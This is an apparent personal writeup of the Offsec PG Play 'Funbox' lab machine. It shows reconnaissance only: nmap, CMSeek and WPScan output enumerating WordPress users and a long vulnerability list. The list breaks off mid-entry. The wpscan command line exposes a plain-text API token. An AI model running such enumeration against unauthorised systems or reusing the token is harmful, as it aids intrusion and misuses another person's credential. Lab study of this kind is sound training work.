---
title: "Funbox"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
  - linux
status: "Done"
difficulty: "Intermediate"
date: 2026-09-23
category:
  - "Linux"
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 3e4759b92751806f884ec3f08272f3bf
---

# Funbox

In: [[Career]] / [[Offsec PG Play]]

### Nmap Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- --min-rate=1000 -oA nmap/funbox 192.168.246.77
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 04:47 -0400
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.44% done; ETC: 04:48 (0:00:32 remaining)
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 82.59% done; ETC: 04:48 (0:00:19 remaining)
Warning: 192.168.246.77 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.246.77
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d2:f6:53:1b:5a:49:7d:74:8d:44:f5:46:e3:93:29:d3 (RSA)
|   256 a6:83:6f:1b:9c:da:b4:41:8c:29:f4:ef:33:4b:20:e0 (ECDSA)
|_  256 a6:5b:80:03:50:19:91:66:b6:c3:98:b8:c4:4f:5c:bd (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://funbox.fritz.box/
| http-robots.txt: 1 disallowed entry 
|_/secret/
33060/tcp open  mysqlx  MySQL X protocol listener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.02 seconds

```

### Recon

![[attachments/Offsec PG Play/Funbox/image.png]]

### Cmseek

```text

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA

 [+]  Deep Scan Results  [+] 

 ┏━Target: funbox.fritz.box
 ┃
 ┠── CMS: WordPress
 ┃    │
 ┃    ├── Version: 5.4.2
 ┃    ╰── URL: https://wordpress.org
 ┃
 ┠──[WordPress Deepscan]
 ┃    │
 ┃    ├── Readme file found: http://funbox.fritz.box//readme.html
 ┃    ├── License file: http://funbox.fritz.box//license.txt
 ┃    ├── Uploads directory has listing enabled: http://funbox.fritz.box//wp-content/uploads
 ┃    │
 ┃    ├── Themes Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Theme: twentyseventeen
 ┃    │        │
 ┃    │        ├── Version: 20190507
 ┃    │        ╰── URL: http://funbox.fritz.box//wp-content/themes/twentyseventeen
 ┃    │
 ┃    │
 ┃    ├── Usernames harvested: 2
 ┃    │    │
 ┃    │    ├── admin
 ┃    │    ╰── joe
 ┃    │
 ┃
 ┠── Result: /home/kali/Result/funbox.fritz.box/cms.json
 ┃
 ┗━Scan Completed in 9.21 Seconds, using 45 Requests

 CMSeeK says ~ Fir milenge
                               
```

### WpSCAN

```bash
┌──(kali㉿kali)-[~]
└─$ sudo wpscan --url http://funbox.fritz.box/ --enumerate --api-token sNBJsnc2OeTuZlSHM3HalpRF7Da9Wq0GBYDC9RPqosQ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://funbox.fritz.box/ [192.168.246.77]
[+] Started: Wed Sep 23 04:51:23 2026
[+] Command Line: wpscan --url http://funbox.fritz.box/ --enumerate --api-token [REDACTED]
[+] Hostname: kali

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://funbox.fritz.box/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://funbox.fritz.box/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://funbox.fritz.box/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://funbox.fritz.box/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://funbox.fritz.box/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://funbox.fritz.box/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |
 | [!] 59 vulnerabilities identified:
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     UUID: 6a3ec618-c79e-4b9c-9020-86b157458ac5
 |     Fixed in: 5.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     UUID: 4cd46653-4470-40ff-8aac-318bee2f998d
 |     Fixed in: 5.4.6
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     UUID: 38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     UUID: 5b754676-20f5-4478-8fd3-6bc383145811
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     UUID: 5d6789db-e320-494b-81bb-e678674f4199
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     UUID: cc23344a-5c91-414a-91e3-c46db614da8d
 |     Fixed in: 5.4.8
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     UUID: 95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     UUID: 7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     UUID: dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     UUID: 24462ac4-7959-4575-97aa-a6dcceeae722
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     UUID: 008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     UUID: 1ac912c1-5e29-41ac-8f76-a062de254c09
 |     Fixed in: 5.4.10
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     UUID: 622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     UUID: 3b1573d4-06b4-442b-bad5-872753118ee0
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     UUID: 601b0bf9-fed2-4675-aec7-fed3156a022f
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     UUID: 713bdc8b-ab7c-46d7-9847-305344a579c4
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     UUID: 926cd097-b36f-4d26-9c51-0dfab11c301b
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     UUID: c5675b59-4b1d-4f64-9876-068e05145431
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     UUID: cfd8b50d-16aa-4319-9c2d-b227365c2156
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     UUID: b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     UUID: 2787684c-aaef-4171-95b4-ee5048c74218
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     UUID: 02d76d8e-9558-41a5-bdb6-3957dc31563b
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     UUID: 3f707e05-25f0-4566-88ed-d8d0aff3a872
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     UUID: 1da03338-557f-4cb6-9a65-3379df4cce47
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     UUID: 58d131f5-f376-4679-b604-2b888de71c5b
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     UUID: b27a8711-a0c0-4996-bd6a-01734702913e
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     UUID: f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     UUID: c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     UUID: 2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     UUID: a03d744a-9839-4167-a356-3e7da0f1d532
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     UUID: 3b574451-2852-4789-bc19-d5cc39948db5
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     UUID: ef289d46-ea83-4fa5-b003-0352c690fd89
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     UUID: 1527ebdb-18bc-4f9d-9c20-8d729a628670
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     UUID: 6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     UUID: 3615aea0-90aa-4f9a-9792-078a90af7f59
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     UUID: d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     UUID: 19380917-4c27-4095-abf1-eba6f913b441
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     UUID: 5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |     Fixed in: 5.4.15
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     UUID: a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |     Fixed in: 5.4.15
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     UUID: 2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     UUID: 7c448f6d-4531-4757-bff0-be9e3220bbbb
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     UUID: 36232787-754a-4234-83d6-6ded5e80251c
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     UUID: c4616b57-770f-4c40-93f8-29571c80330a
 |     Fixed in: 5.4.18
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     UUID: 1e2dad30-dd95-4142-903b-4d5c580eaad2
 |     Fixed in: 5.4.18
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Email Change Confirmation Bypass
 |     UUID: 5ca38157-6fae-4271-a242-2a8584505d1e
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/5ca38157-6fae-4271-a242-2a8584505d1e
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Unauthenticated Blind SSRF
 |     UUID: e1b9918e-1db9-4d95-be44-3241e52946eb
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/e1b9918e-1db9-4d95-be44-3241e52946eb
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Contributor+ Stored XSS in Quick Edits
 |     UUID: 72b68d3f-77a0-47dd-9624-e3631409a352
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/72b68d3f-77a0-47dd-9624-e3631409a352
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Arbitrary Site Creation on Multisite
 |     UUID: b9b44801-3260-4f5a-a4cb-74f2de87e0d1
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/b9b44801-3260-4f5a-a4cb-74f2de87e0d1
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Reflected XSS
 |     UUID: 4594236f-c7ad-41d6-945b-170eaabe2b75
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/4594236f-c7ad-41d6-945b-170eaabe2b75
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.4 - Author+ RCE via PDF Upload
 |     UUID: 5061a614-ee26-422a-b4e8-ec88b96bb3cd
 |     Fixed in: 5.4.21
 |     References:
 |      - https://wpscan.com/vulnerability/5061a614-ee26-422a-b4e8-ec88b96bb3cd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-65640
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-4-release/
 |
 | [!] Title: WP < 7.1.1 - Unauthenticated Stored XSS via Comments
 |     UUID: aa354358-3a32-4e81-8628-d1aa917b5efa
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/aa354358-3a32-4e81-8628-d1aa917b5efa
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ Stored XSS via Custom Header
 |     UUID: 0e4cc769-a934-4883-9da5-5721133c6305
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/0e4cc769-a934-4883-9da5-5721133c6305
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Theme Installation via CSRF
 |     UUID: 2624e094-6c88-43b4-812f-26444994737d
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/2624e094-6c88-43b4-812f-26444994737d
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ Network-Wide Plugin Activation on Multisite
 |     UUID: 0d1f24a1-2161-47cc-8c2d-c3009161153d
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/0d1f24a1-2161-47cc-8c2d-c3009161153d
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ CSS Injection on Multisite via XML-RPC
